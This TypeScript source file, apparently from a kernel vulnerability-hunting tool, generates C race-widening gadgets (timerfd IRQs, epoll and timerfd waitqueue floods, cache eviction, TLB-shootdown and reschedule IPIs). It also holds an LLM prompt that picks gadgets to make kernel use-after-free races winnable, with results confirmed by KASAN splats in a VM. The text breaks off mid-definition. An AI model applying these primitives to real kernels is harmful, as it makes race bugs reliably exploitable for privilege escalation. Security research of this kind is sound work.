/**
 * Race-winning widening-gadget engine (#1120).
 *
 * A candidate race is only useful if you can WIN it. The gap between "there is
 * a data race here" and "I have a reliable KASAN splat" is almost entirely
 * about the *width* of the racing window: a ~6-instruction UAF window is lost
 * ~99% of the time on a warm cache, but the SAME window can be won ~99% of the
 * time once you (a) evict the racing load out of cache, (b) fire an interrupt
 * inside it, and (c) slow the racing worker down with thousands of waitqueue
 * entries. That is exactly how the Bad Epoll / CVE-2026-46242 UAF was made
 * reliable: cache-miss to crack the window + a timerfd-expiry interrupt fired
 * inside it + ~50k epoll waitqueue items flooding the racing worker.
 *
 * This module turns that hand-won recipe into a reusable library:
 *
 *   1. A **widening-gadget library** — parameterized primitives, each of which
 *      emits a C setup snippet (spliced into the exploit) plus the prover env
 *      knobs it wants (`PWNKIT_RACE_*` / `PWNKIT_KERNEL_QEMU_WIDEN_*`).
 *   2. An **LLM gadget-selector** (`selectRaceGadgets`) — given a race
 *      candidate it picks and parameterizes the gadgets most likely to widen
 *      THAT window, returning an ordered list to try. Routed through the
 *      engine's existing `LlmApiRuntime` (no raw keys).
 *   3. A **driver** (`attemptWinRace`) that composes the selected gadgets into
 *      the existing race-widening prover invocation (`kernel-vm-runner`) and
 *      reports whether the widened race became a reliable KASAN splat
 *      (confirmed + win-rate across boots).
 *
 * The gadget library + selector + driver are real. The VM confirmation is
 * pluggable: `attemptWinRace` takes an injectable {@link RaceProver} (stubbed
 * in tests), and {@link makeKernelVmRaceProver} wires the real on-box
 * `verifyKernelFinding` path (widen env + gadget-C splice) for live runs.
 */

import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { NativeRuntime } from "../runtime/types.js";
import { LlmApiRuntime } from "../runtime/llm-api.js";
import type {
  KernelFindingVerification,
  VerifyKernelFindingOptions,
} from "./kernel-vm-runner.js";

// ── Race candidates ─────────────────────────────────────────────────

/**
 * A KCSAN-style data-race candidate: two conflicting accesses to the same
 * object from different contexts.
 */
export interface KcsanRaceCandidate {
  kind: "kcsan";
  /** Bug class hint, e.g. "data-race", "uaf-race". */
  bugClass?: string;
  /** First (typically attacker-driven) access. */
  access1: RaceAccess;
  /** Second (typically the racing worker) access. */
  access2: RaceAccess;
  /** Faulting PC to widen with the mdelay kprobe (symbol + hex offset). */
  faultingSymbol?: string;
  faultingOffset?: number;
  note?: string;
}

export interface RaceAccess {
  func: string;
  file?: string;
  line?: number;
  /** "read" | "write" — helps the selector reason about which side to slow. */
  mode?: "read" | "write";
}

/**
 * A smell-hunter candidate: an attacker-reachable window between two locked
 * sections, opened by a sleep/blocking point that the racing worker can be
 * suspended inside.
 */
export interface SmellRaceCandidate {
  kind: "smell";
  /** Lock taken before the window. */
  lockA: string;
  /** The sleeping / blocking point the racing worker parks in (symbol). */
  sleepPoint: string;
  /** Lock taken after the window. */
  lockB: string;
  /** What the attacker controls to drive the racing free/reuse. */
  attackerState: string;
  /** Faulting PC to widen with the mdelay kprobe (symbol + hex offset). */
  faultingSymbol?: string;
  faultingOffset?: number;
  note?: string;
}

export type RaceCandidate = KcsanRaceCandidate | SmellRaceCandidate;

function candidateSummary(c: RaceCandidate): string {
  if (c.kind === "kcsan") {
    const a1 = `${c.access1.func}${c.access1.mode ? `(${c.access1.mode})` : ""}`;
    const a2 = `${c.access2.func}${c.access2.mode ? `(${c.access2.mode})` : ""}`;
    return [
      `KCSAN data-race (${c.bugClass ?? "data-race"})`,
      `  access1: ${a1}${c.access1.file ? ` @ ${c.access1.file}:${c.access1.line ?? "?"}` : ""}`,
      `  access2: ${a2}${c.access2.file ? ` @ ${c.access2.file}:${c.access2.line ?? "?"}` : ""}`,
      c.faultingSymbol ? `  faulting PC: ${c.faultingSymbol}+0x${(c.faultingOffset ?? 0).toString(16)}` : "",
      c.note ? `  note: ${c.note}` : "",
    ]
      .filter(Boolean)
      .join("\n");
  }
  return [
    "Smell-hunter race window",
    `  lockA: ${c.lockA}`,
    `  sleepPoint: ${c.sleepPoint}`,
    `  lockB: ${c.lockB}`,
    `  attackerState: ${c.attackerState}`,
    c.faultingSymbol ? `  faulting PC: ${c.faultingSymbol}+0x${(c.faultingOffset ?? 0).toString(16)}` : "",
    c.note ? `  note: ${c.note}` : "",
  ]
    .filter(Boolean)
    .join("\n");
}

function candidateWiden(c: RaceCandidate): WidenSpec | undefined {
  if (c.faultingSymbol === undefined || c.faultingOffset === undefined) return undefined;
  return { symbol: c.faultingSymbol, offset: c.faultingOffset };
}

// ── Widening gadgets ────────────────────────────────────────────────

export type GadgetKind =
  | "timerfd_interrupt"
  | "epoll_waitqueue_flood"
  | "cache_miss_stall"
  | "mutex_sleep_widen"
  | "futex_hold"
  // ExpRace-style real-IPI window wideners (#1 in the LPE-hunt upgrade plan).
  | "reschedule_ipi"
  | "tlb_shootdown_ipi"
  | "membarrier_ipi"
  | "waitqueue_freeze"
  | "retry_until_splat";

export const GADGET_KINDS: readonly GadgetKind[] = [
  "timerfd_interrupt",
  "epoll_waitqueue_flood",
  "cache_miss_stall",
  "mutex_sleep_widen",
  "futex_hold",
  "reschedule_ipi",
  "tlb_shootdown_ipi",
  "membarrier_ipi",
  "waitqueue_freeze",
  "retry_until_splat",
] as const;

/**
 * A parameterized widening primitive. `renderSetup()` emits the C that arms
 * the widening effect (spliced into the exploit before the racing section);
 * `proverEnv()` emits the `PWNKIT_RACE_*` / `PWNKIT_KERNEL_QEMU_WIDEN_*` knobs
 * the prover lane should carry for this gadget.
 */
export interface RaceGadget {
  name: GadgetKind;
  params: Record<string, number>;
  /** Human note on why/how this gadget widens the window. */
  rationale: string;
  renderSetup(): string;
  proverEnv(): Record<string, string>;
  /**
   * Kernel `.config` symbol this tactic REQUIRES to be effective (e.g.
   * `CONFIG_PREEMPT` for the reschedule-IPI tactic — a reschedule IPI only
   * preempts the racing worker mid-window under full preemption). When set,
   * {@link filterGadgetsByConfig} drops the gadget (fail-soft) if the target
   * `.config` does not enable it. Undefined ⇒ works on any config.
   */
  requiredConfig?: string;
  /**
   * The extra libc headers the tactic's C needs. Merged by the harness renderer
   * so the emitted program compiles without the caller tracking includes.
   */
  headers?: readonly string[];
}

function clampInt(v: unknown, min: number, max: number, dflt: number): number {
  const n = typeof v === "number" ? v : typeof v === "string" ? Number(v) : NaN;
  if (!Number.isFinite(n)) return dflt;
  return Math.min(max, Math.max(min, Math.trunc(n)));
}

/**
 * `timerfd_interrupt` — arm a short-interval `timerfd` so its expiry fires an
 * IRQ *inside* the racing window, preempting the racing worker mid-flight.
 * This is the "interrupt fired inside the window" leg of the Bad Epoll recipe.
 */
export function timerfdInterruptGadget(params: { intervalNs?: number } = {}): RaceGadget {
  const intervalNs = clampInt(params.intervalNs, 1_000, 10_000_000, 50_000);
  return {
    name: "timerfd_interrupt",
    params: { intervalNs },
    rationale: `Fire a timerfd IRQ every ${intervalNs}ns to preempt the racing worker inside the window.`,
    renderSetup() {
      return [
        "/* gadget: timerfd_interrupt — periodic IRQ inside the race window */",
        "{",
        "  int __tfd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK);",
        "  if (__tfd >= 0) {",
        "    struct itimerspec __its = {",
        `      .it_interval = { .tv_sec = 0, .tv_nsec = ${intervalNs} },`,
        `      .it_value    = { .tv_sec = 0, .tv_nsec = ${intervalNs} },`,
        "    };",
        "    timerfd_settime(__tfd, 0, &__its, NULL);",
        "  }",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return { PWNKIT_RACE_WIDEN_TIMERFD_NS: String(intervalNs) };
    },
  };
}

/**
 * `epoll_waitqueue_flood` — register N pollable fds on one epoll instance so
 * the racing worker's `poll`/wakeup walk traverses a huge waitqueue, slowing
 * it enough that the attacker wins the reuse. The "~50k waitqueue items" leg.
 */
export function epollWaitqueueFloodGadget(params: { items?: number } = {}): RaceGadget {
  const items = clampInt(params.items, 16, 200_000, 50_000);
  // The flood also benefits from more concurrent flood threads on the prover.
  const floodThreads = clampInt(Math.ceil(items / 4_096), 1, 64, 8);
  return {
    name: "epoll_waitqueue_flood",
    params: { items },
    rationale: `Add ${items} epoll waitqueue entries to slow the racing worker's wakeup walk.`,
    renderSetup() {
      return [
        "/* gadget: epoll_waitqueue_flood — bloat the racing worker's waitqueue */",
        "{",
        "  int __ep = epoll_create1(0);",
        `  for (int __i = 0; __ep >= 0 && __i < ${items}; __i++) {`,
        "    int __pp[2];",
        "    if (pipe(__pp) != 0) break;",
        "    struct epoll_event __ev = { .events = EPOLLIN, .data = { .fd = __pp[0] } };",
        "    epoll_ctl(__ep, EPOLL_CTL_ADD, __pp[0], &__ev);",
        "  }",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return {
        PWNKIT_RACE_WIDEN_EPOLL_ITEMS: String(items),
        PWNKIT_RACE_FLOOD_THREADS: String(floodThreads),
      };
    },
  };
}

/**
 * `cache_miss_stall` — stride a working set larger than L2/L3 to evict the
 * racing load's cache line, so the racing access takes a full memory round-trip
 * and the window is "cracked" open. The cache-miss leg of the recipe.
 */
export function cacheMissStallGadget(
  params: { footprintKb?: number; strideBytes?: number } = {},
): RaceGadget {
  const footprintKb = clampInt(params.footprintKb, 64, 262_144, 16_384);
  const strideBytes = clampInt(params.strideBytes, 8, 4_096, 64);
  return {
    name: "cache_miss_stall",
    params: { footprintKb, strideBytes },
    rationale: `Evict the racing load by striding a ${footprintKb}KB buffer at ${strideBytes}B to force a cache miss.`,
    renderSetup() {
      return [
        "/* gadget: cache_miss_stall — evict the racing line to widen the load */",
        "{",
        `  size_t __sz = (size_t)${footprintKb} * 1024;`,
        "  volatile unsigned char *__buf = (volatile unsigned char *)malloc(__sz);",
        "  if (__buf) {",
        `    for (size_t __i = 0; __i < __sz; __i += ${strideBytes}) __buf[__i] ^= 1;`,
        "  }",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return {
        PWNKIT_RACE_WIDEN_CACHE_KB: String(footprintKb),
        PWNKIT_RACE_WIDEN_CACHE_STRIDE: String(strideBytes),
        // Cache eviction is most effective when the racer is pinned same-CPU.
        PWNKIT_RACE_SAME_CPU: "1",
      };
    },
  };
}

/**
 * `mutex_sleep_widen` — park the attacker thread briefly (nanosleep) right at
 * the sleep point so the racing worker is scheduled while the object is in its
 * half-freed state, widening a sleep-bounded window.
 */
export function mutexSleepWidenGadget(params: { holdUs?: number } = {}): RaceGadget {
  const holdUs = clampInt(params.holdUs, 1, 5_000_000, 200);
  return {
    name: "mutex_sleep_widen",
    params: { holdUs },
    rationale: `nanosleep ${holdUs}us at the sleep point to keep the object half-freed while the racer runs.`,
    renderSetup() {
      return [
        "/* gadget: mutex_sleep_widen — hold at the sleep point to widen the window */",
        "{",
        "  struct timespec __ts = {",
        `    .tv_sec  = ${Math.trunc(holdUs / 1_000_000)},`,
        `    .tv_nsec = ${(holdUs % 1_000_000) * 1000},`,
        "  };",
        "  nanosleep(&__ts, NULL);",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return { PWNKIT_RACE_PARK_US: String(holdUs) };
    },
  };
}

/**
 * `futex_hold` — spin a helper thread holding a futex for `holdUs`, pinning the
 * racing worker in `futex_wait` inside the window. Useful when the sleep point
 * is a futex/lock the attacker can contend.
 */
export function futexHoldGadget(params: { holdUs?: number } = {}): RaceGadget {
  const holdUs = clampInt(params.holdUs, 1, 5_000_000, 500);
  return {
    name: "futex_hold",
    params: { holdUs },
    rationale: `Contend a futex for ${holdUs}us so the racing worker parks in futex_wait inside the window.`,
    renderSetup() {
      return [
        "/* gadget: futex_hold — contend a futex to park the racing worker */",
        "{",
        "  static int __futex_word = 1;",
        "  struct timespec __to = {",
        `    .tv_sec  = ${Math.trunc(holdUs / 1_000_000)},`,
        `    .tv_nsec = ${(holdUs % 1_000_000) * 1000},`,
        "  };",
        "  syscall(SYS_futex, &__futex_word, FUTEX_WAIT, 1, &__to, NULL, 0);",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return { PWNKIT_RACE_WIDEN_FUTEX_US: String(holdUs) };
    },
  };
}

// ── ExpRace-style real-IPI window wideners (LPE-hunt upgrade #1) ─────
//
// The gadgets above widen a window by SLOWING the racing worker (cache miss,
// waitqueue bloat, sleep). ExpRace (USENIX'21) widens it the other way: fire a
// real inter-processor interrupt (IPI) at the CPU running the racing worker so
// the kernel is *preempted mid-window*. Three userspace IPI sources — a
// reschedule IPI (`sched_setaffinity`), a TLB-shootdown IPI (`mprotect`/
// `munmap` on a shared mm), and `membarrier` expedited — plus calif's giant
// wait-queue freeze and Bad Epoll's non-crashing retry loop. All userspace-only,
// no debug gate. Each maps 1:1 to a `renderSetup()` C snippet + `PWNKIT_RACE_*`
// prover knob, and declares the `.config` symbol it needs (config-gated).

/**
 * `reschedule_ipi` — ExpRace's reschedule-IPI widener. A `sched_setaffinity`
 * that migrates a thread already running on another CPU makes the scheduler
 * send a RESCHEDULE IPI to that CPU; fired in a tight loop across the racing
 * CPU it preempts the racing worker *inside* the window. Only effective under
 * `CONFIG_PREEMPT` (voluntary/none preemption won't preempt kernel-mode code
 * mid-window), so it is config-gated on it.
 */
export function rescheduleIpiGadget(
  params: { targetCpu?: number; bounces?: number } = {},
): RaceGadget {
  const targetCpu = clampInt(params.targetCpu, 0, 4_095, 1);
  const bounces = clampInt(params.bounces, 1, 10_000_000, 2_000);
  return {
    name: "reschedule_ipi",
    params: { targetCpu, bounces },
    rationale: `Bounce affinity across CPU ${targetCpu} ${bounces}x to fire reschedule IPIs that preempt the racing worker mid-window (needs CONFIG_PREEMPT).`,
    requiredConfig: "CONFIG_PREEMPT",
    headers: ["#define _GNU_SOURCE", "#include <sched.h>", "#include <pthread.h>"],
    renderSetup() {
      return [
        "/* gadget: reschedule_ipi — ExpRace reschedule-IPI (needs CONFIG_PREEMPT) */",
        "{",
        "  cpu_set_t __rs_a, __rs_b;",
        `  CPU_ZERO(&__rs_a); CPU_SET(${targetCpu}, &__rs_a);`,
        `  CPU_ZERO(&__rs_b); CPU_SET(${targetCpu + 1}, &__rs_b);`,
        `  for (int __k = 0; __k < ${bounces}; __k++) {`,
        "    /* Re-pinning a running thread across CPUs makes the scheduler send a",
        "       reschedule IPI to the CPU it was on — the ExpRace preemption source. */",
        "    sched_setaffinity(0, sizeof(__rs_a), &__rs_a);",
        "    sched_setaffinity(0, sizeof(__rs_b), &__rs_b);",
        "  }",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return {
        PWNKIT_RACE_WIDEN_RESCHED_BOUNCES: String(bounces),
        PWNKIT_RACE_SAME_CPU: "0",
      };
    },
  };
}

/**
 * `tlb_shootdown_ipi` — a `mprotect()` (or `munmap()`) on a page mapped into an
 * mm shared by the racing thread forces a TLB-shootdown IPI to every CPU
 * running a thread of that mm. Flipping a shared page's protection in a loop
 * rains TLB-flush IPIs on the racing CPU, preempting the window. Works on any
 * SMP config (no preemption requirement) — the IPI is unconditional.
 */
export function tlbShootdownIpiGadget(params: { flips?: number } = {}): RaceGadget {
  const flips = clampInt(params.flips, 1, 10_000_000, 2_000);
  return {
    name: "tlb_shootdown_ipi",
    params: { flips },
    rationale: `Flip a shared page's protection ${flips}x (mprotect) to rain TLB-shootdown IPIs on the racing CPU.`,
    headers: ["#include <sys/mman.h>", "#include <unistd.h>"],
    renderSetup() {
      return [
        "/* gadget: tlb_shootdown_ipi — mprotect() TLB-shootdown IPI widener */",
        "{",
        "  long __pg = sysconf(_SC_PAGESIZE);",
        "  void *__tm = mmap(NULL, __pg, PROT_READ | PROT_WRITE,",
        "                    MAP_ANONYMOUS | MAP_SHARED, -1, 0);",
        "  if (__tm != MAP_FAILED) {",
        `    for (int __k = 0; __k < ${flips}; __k++) {`,
        "      /* All threads share this mm, so each protection change shoots down",
        "         the racing CPU's TLB via IPI — an unconditional preemption. */",
        "      mprotect(__tm, __pg, PROT_READ);",
        "      mprotect(__tm, __pg, PROT_READ | PROT_WRITE);",
        "    }",
        "  }",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return { PWNKIT_RACE_WIDEN_TLB_FLIPS: String(flips) };
    },
  };
}

/**
 * `membarrier_ipi` — `membarrier(PRIVATE_EXPEDITED)` sends an IPI to every CPU
 * running a thread of the calling process to serialize memory. Fired in a loop
 * it is a clean, dependency-free IPI source. Needs `CONFIG_MEMBARRIER` (usually
 * on, but config-gated so a stripped kernel fails soft).
 */
export function membarrierIpiGadget(params: { count?: number } = {}): RaceGadget {
  const count = clampInt(params.count, 1, 10_000_000, 2_000);
  return {
    name: "membarrier_ipi",
    params: { count },
    rationale: `Fire ${count} membarrier(PRIVATE_EXPEDITED) IPIs at the racing CPU (needs CONFIG_MEMBARRIER).`,
    requiredConfig: "CONFIG_MEMBARRIER",
    headers: ["#include <sys/syscall.h>", "#include <unistd.h>"],
    renderSetup() {
      return [
        "/* gadget: membarrier_ipi — membarrier() expedited IPI widener */",
        "#ifndef MEMBARRIER_CMD_PRIVATE_EXPEDITED",
        "#define MEMBARRIER_CMD_PRIVATE_EXPEDITED (1 << 3)",
        "#endif",
        "#ifndef MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED",
        "#define MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED (1 << 4)",
        "#endif",
        "{",
        "  syscall(SYS_membarrier, MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED, 0, 0);",
        `  for (int __k = 0; __k < ${count}; __k++)`,
        "    syscall(SYS_membarrier, MEMBARRIER_CMD_PRIVATE_EXPEDITED, 0, 0);",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return { PWNKIT_RACE_WIDEN_MEMBARRIER: String(count) };
    },
  };
}

/**
 * `waitqueue_freeze` — calif's (blog.calif.io) 720k-entry timerfd/epoll wait-
 * queue freeze: register a huge number of `timerfd`s on one epoll instance so a
 * wakeup walk under the wait-queue lock stalls the racing worker for a long,
 * attacker-chosen window. Distinct from `epoll_waitqueue_flood` in scale +
 * source (timerfds, not pipes) — this is the "freeze for milliseconds" tactic.
 */
export function waitqueueFreezeGadget(params: { entries?: number } = {}): RaceGadget {
  const entries = clampInt(params.entries, 1_024, 2_000_000, 720_000);
  return {
    name: "waitqueue_freeze",
    params: { entries },
    rationale: `Register ${entries} timerfds on one epoll (calif) so a wakeup walk freezes the racing worker.`,
    headers: [
      "#include <sys/timerfd.h>",
      "#include <sys/epoll.h>",
      "#include <time.h>",
    ],
    renderSetup() {
      return [
        "/* gadget: waitqueue_freeze — calif 720k timerfd/epoll wait-queue freeze */",
        "{",
        "  int __wf_ep = epoll_create1(0);",
        `  for (int __i = 0; __wf_ep >= 0 && __i < ${entries}; __i++) {`,
        "    int __wf_t = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK);",
        "    if (__wf_t < 0) break;",
        "    struct epoll_event __wf_ev = { .events = EPOLLIN, .data = { .fd = __wf_t } };",
        "    epoll_ctl(__wf_ep, EPOLL_CTL_ADD, __wf_t, &__wf_ev);",
        "  }",
        "}",
      ].join("\n");
    },
    proverEnv() {
      return { PWNKIT_RACE_WIDEN_WAITQUEUE_ENTRIES: String(entries) };
    },
  };
}

/**
 * `retry_until_splat` — Bad Epoll's (github.com/J-jaeyoung/bad-epoll) key
 * reliability trick: rather than one-shot the race, loop it until the sanitizer
 * fires, and NEVER let the harness itself panic/segfault (the kernel splat is
 * the only terminator). This gadget carries no C of its own — the retry loop
 * lives in the {@link renderRealIpiRaceHarness} template — it only sets the
 * `PWNKIT_RACE_*` budget knobs the harness reads.
 */
export function retryUntilSplatGadget(
  params: { retries?: number; seconds?: number } = {},
): RaceGadget {
  const retries = clampInt(params.retries, 1, 100_000_000, 200_000);
  const seconds = clampInt(params.seconds, 1, 3_600, 40);
  return {
    name: "retry_until_splat",
    params: { retries, seconds },
    rationale: `Loop the race up to ${retries}x / ${seconds}s until KASAN/KCSAN fires; never panic (Bad Epoll).`,
    renderSetup() {
      return [
        "/* gadget: retry_until_splat — the harness wraps the race in a non-crashing",
        `   retry loop (<=${retries} iters / ${seconds}s). No inline C. */`,
      ].join("\n");
    },
    proverEnv() {
      return {
        PWNKIT_RACE_RETRIES: String(retries),
        PWNKIT_RACE_SECONDS: String(seconds),
      };
    },
  };
}

/** Factory registry keyed by gadget name — lets the selector instantiate by name. */
export const GADGET_FACTORIES: Record<GadgetKind, (params: Record<string, number>) => RaceGadget> = {
  timerfd_interrupt: (p) => timerfdInterruptGadget(p),
  epoll_waitqueue_flood: (p) => epollWaitqueueFloodGadget(p),
  cache_miss_stall: (p) => cacheMissStallGadget(p),
  mutex_sleep_widen: (p) => mutexSleepWidenGadget(p),
  futex_hold: (p) => futexHoldGadget(p),
  reschedule_ipi: (p) => rescheduleIpiGadget(p),
  tlb_shootdown_ipi: (p) => tlbShootdownIpiGadget(p),
  membarrier_ipi: (p) => membarrierIpiGadget(p),
  waitqueue_freeze: (p) => waitqueueFreezeGadget(p),
  retry_until_splat: (p) => retryUntilSplatGadget(p),
};

/** Instantiate a gadget by name with (possibly partial/invalid) params. Returns
 * `undefined` for an unknown name. Params are clamped inside each factory. */
export function instantiateGadget(
  name: string,
  params: Record<string, number> = {},
): RaceGadget | undefined {
  const factory = GADGET_FACTORIES[name as GadgetKind];
  return factory ? factory(params) : undefined;
}

// ── Compose ─────────────────────────────────────────────────────────

export interface WidenSpec {
  symbol: string;
  offset: number;
}

export interface ComposedGadgets {
  /** Concatenated C setup, spliced into the exploit before the racing section. */
  setupC: string;
  /** Merged prover env across all gadgets (later gadgets win on key clashes). */
  proverEnv: Record<string, string>;
  /** Ordered gadget names actually composed. */
  gadgetNames: GadgetKind[];
}

/** Compose an ordered gadget list into a single C setup block + merged env. */
export function composeGadgetSetup(gadgets: RaceGadget[]): ComposedGadgets {
  const parts: string[] = [];
  const proverEnv: Record<string, string> = {};
  const gadgetNames: GadgetKind[] = [];
  for (const g of gadgets) {
    parts.push(g.renderSetup());
    Object.assign(proverEnv, g.proverEnv());
    gadgetNames.push(g.name);
  }
  const setupC = [
    "/* ── pwnkit race-widening gadgets (composed) ─────────────────── */",
    ...parts,
    "/* ── end race-widening gadgets ───────────────────────────────── */",
  ].join("\n");
  return { setupC, proverEnv, gadgetNames };
}

// ── Config gating (fail-soft) ───────────────────────────────────────

export interface GadgetConfigFilter {
  /** Gadgets whose `requiredConfig` is satisfied (or that need none). */
  kept: RaceGadget[];
  /** Gadgets dropped because the target `.config` lacks their symbol. */
  skipped: { name: GadgetKind; requiredConfig: string }[];
}

/**
 * Is `symbol` enabled (`=y` or `=m`) in a kernel `.config` text? A bare
 * `# CONFIG_X is not set` or absence counts as OFF.
 */
export function isConfigEnabled(kernelConfig: string, symbol: string): boolean {
  const re = new RegExp(`^${symbol}=(y|m)\\s*$`, "m");
  return re.test(kernelConfig);
}

/**
 * Drop config-gated gadgets whose required `.config` symbol is not enabled in
 * the target kernel — FAIL-SOFT: an unsupported tactic (e.g. reschedule-IPI on
 * a non-`CONFIG_PREEMPT` kernel) is skipped, never a hard error, so the rest of
 * the recipe still runs. When `kernelConfig` is undefined we cannot gate, so
 * every gadget is kept (the live prover will simply no-op an ineffective one).
 */
export function filterGadgetsByConfig(
  gadgets: RaceGadget[],
  kernelConfig: string | undefined,
): GadgetConfigFilter {
  if (kernelConfig === undefined) return { kept: [...gadgets], skipped: [] };
  const kept: RaceGadget[] = [];
  const skipped: { name: GadgetKind; requiredConfig: string }[] = [];
  for (const g of gadgets) {
    if (g.requiredConfig && !isConfigEnabled(kernelConfig, g.requiredConfig)) {
      skipped.push({ name: g.name, requiredConfig: g.requiredConfig });
    } else {
      kept.push(g);
    }
  }
  return { kept, skipped };
}

// ── LLM gadget selector ─────────────────────────────────────────────

export interface SelectGadgetsOptions {
  /** Injectable runtime (tests pass a fake). Defaults to `LlmApiRuntime`. */
  runtime?: NativeRuntime;
  model?: string;
  timeoutMs?: number;
  /** Retries on empty / unparseable model output. Default 3. */
  attempts?: number;
  /** Cap on how many gadgets to return. Default 4. */
  maxGadgets?: number;
  logger?: (line: string) => void;
}

const SELECTOR_SYSTEM = [
  "You are a Linux kernel race-exploitation expert. Given a race candidate, pick",
  "the ordered set of WIDENING GADGETS most likely to make THAT specific race",
  "window reliably winnable, and parameterize each one.",
  "",
  "Available gadgets and their tunable params (all integers):",
  "  timerfd_interrupt      { intervalNs }   — fire an IRQ inside the window.",
  "  epoll_waitqueue_flood  { items }        — slow the racing worker's wakeup walk.",
  "  cache_miss_stall       { footprintKb, strideBytes } — evict the racing load.",
  "  mutex_sleep_widen      { holdUs }       — hold at a sleep point.",
  "  futex_hold             { holdUs }       — park the racing worker in futex_wait.",
  "  reschedule_ipi         { targetCpu, bounces } — ExpRace reschedule IPI (needs CONFIG_PREEMPT).",
  "  tlb_shootdown_ipi      { flips }        — mprotect TLB-shootdown IPI (any SMP config).",
  "  membarrier_ipi         { count }        — membarrier expedited IPI (needs CONFIG_MEMBARRIER).",
  "  waitqueue_freeze       { entries }      — calif 720k timerfd/epoll wait-queue freeze.",
  "  retry_until_splat      { retries, seconds } — loop the race until the sanitizer fires; never panic.",
  "",
  "Guidance: a tight UAF window usually needs cache_miss_stall + timerfd_interrupt +",
  "waitqueue_freeze together (the proven Bad Epoll recipe), layered with a real-IPI",
  "preemption source (reschedule_ipi / tlb_shootdown_ipi / membarrier_ipi, ExpRace)",
  "and wrapped by retry_until_splat. A sleep-bounded smell window benefits from",
  "mutex_sleep_widen / futex_hold at the sleepPoint plus an IPI source. Prefer",
  "reschedule_ipi only when the target has CONFIG_PREEMPT. Order by how you layer them.",
  "",
  'Respond with ONLY a JSON object: {"gadgets":[{"name":"<gadget>","params":{...},"why":"<short>"}]}.',
].join("\n");

function buildSelectorPrompt(candidate: RaceCandidate): string {
  return ["RACE CANDIDATE:", candidateSummary(candidate), "", "Pick and parameterize the widening gadgets."].join("\n");
}

function extractJson(text: string): unknown {
  let s = text.trim();
  const fence = s.match(/```(?:json)?\s*([\s\S]*?)```/);
  if (fence) s = fence[1].trim();
  const start = s.indexOf("{");
  const end = s.lastIndexOf("}");
  if (start >= 0 && end > start) s = s.slice(start, end + 1);
  return JSON.parse(s);
}

/**
 * Deterministic fallback when the LLM is unavailable / returns nothing usable.
 * Encodes the proven recipes so the driver always has something to try.
 */
export function defaultGadgetsFor(candidate: RaceCandidate): RaceGadget[] {
  if (candidate.kind === "smell") {
    // Sleep-bounded window: park at the sleep point, crack the load, fire a real
    // (TLB-shootdown) IPI to preempt the racing worker, under the retry loop.
    return [
      mutexSleepWidenGadget(),
      cacheMissStallGadget(),
      tlbShootdownIpiGadget(),
      retryUntilSplatGadget(),
    ];
  }
  // KCSAN / UAF race → Bad Epoll recipe (cache-crack + timerfd IRQ) layered with
  // the ExpRace reschedule-IPI, all under the non-crashing retry loop.
  return [
    cacheMissStallGadget(),
    timerfdInterruptGadget(),
    rescheduleIpiGadget(),
    retryUntilSplatGadget(),
  ];
}

/**
 * LLM gadget-selector. Given a race candidate, ask the model to pick and
 * parameterize the widening gadgets likely to widen THAT window, and return an
 * ordered `RaceGadget[]` to try. Routed through the engine's provider routing
 * (`LlmApiRuntime` — no raw keys). Falls back to {@link defaultGadgetsFor} on
 * empty / unparseable output so the caller always gets a non-empty list.
 */
export async function selectRaceGadgets(
  candidate: RaceCandidate,
  opts: SelectGadgetsOptions = {},
): Promise<RaceGadget[]> {
  const attempts = Math.max(1, opts.attempts ?? 3);
  const maxGadgets = Math.max(1, opts.maxGadgets ?? 4);
  const log = opts.logger;
  const runtime: NativeRuntime =
    opts.runtime ??
    new LlmApiRuntime({
      type: "api",
      timeout: opts.timeoutMs ?? 120_000,
      ...(opts.model ? { model: opts.model } : {}),
    });

  const prompt = buildSelectorPrompt(candidate);
  type Parsed = { gadgets?: Array<{ name?: string; params?: Record<string, number> }> };
  let parsed: Parsed | null = null;

  for (let attempt = 1; attempt <= attempts && !parsed; attempt++) {
    let text = "";
    try {
      const result = await runtime.executeNative(
        SELECTOR_SYSTEM,
        [{ role: "user", content: [{ type: "text", text: prompt }] }],
        [],
      );
      text = result.content
        .filter((b): b is { type: "text"; text: string } => b.type === "text")
        .map((b) => b.text)
        .join("\n")
        .trim();
    } catch (e) {
      log?.(`[race-gadgets:select] attempt ${attempt} runtime error: ${String(e)}`);
      continue;
    }
    if (!text) {
      log?.(`[race-gadgets:select] attempt ${attempt} empty output`);
      continue;
    }
    try {
      parsed = extractJson(text) as Parsed;
    } catch (e) {
      log?.(`[race-gadgets:select] attempt ${attempt} JSON parse failed: ${String(e)}`);
    }
  }

  if (!parsed?.gadgets?.length) {
    log?.("[race-gadgets:select] falling back to default recipe");
    return defaultGadgetsFor(candidate).slice(0, maxGadgets);
  }

  const seen = new Set<GadgetKind>();
  const gadgets: RaceGadget[] = [];
  for (const g of parsed.gadgets) {
    if (typeof g?.name !== "string") continue;
    const inst = instantiateGadget(g.name, g.params ?? {});
    if (!inst) continue;
    if (seen.has(inst.name)) continue; // dedupe — one instance per kind
    seen.add(inst.name);
    gadgets.push(inst);
    if (gadgets.length >= maxGadgets) break;
  }

  if (gadgets.length === 0) {
    log?.("[race-gadgets:select] model named no valid gadgets — using default recipe");
    return defaultGadgetsFor(candidate).slice(0, maxGadgets);
  }
  return gadgets;
}

// ── Driver: attemptWinRace ──────────────────────────────────────────

/** Per-boot input handed to a {@link RaceProver}. */
export interface RaceProverInput {
  candidate: RaceCandidate;
  /** Composed gadget C to splice into the exploit setup. */
  setupC: string;
  /** Merged prover env for this attempt. */
  proverEnv: Record<string, string>;
  /** mdelay-kprobe widen target, when the candidate carries a faulting PC. */
  widen?: WidenSpec;
  /** 0-based boot index of this attempt. */
  bootIndex: number;
}

/** Per-boot outcome from a {@link RaceProver}. */
export interface RaceProverOutcome {
  /** True when this boot produced a recognized KASAN splat. */
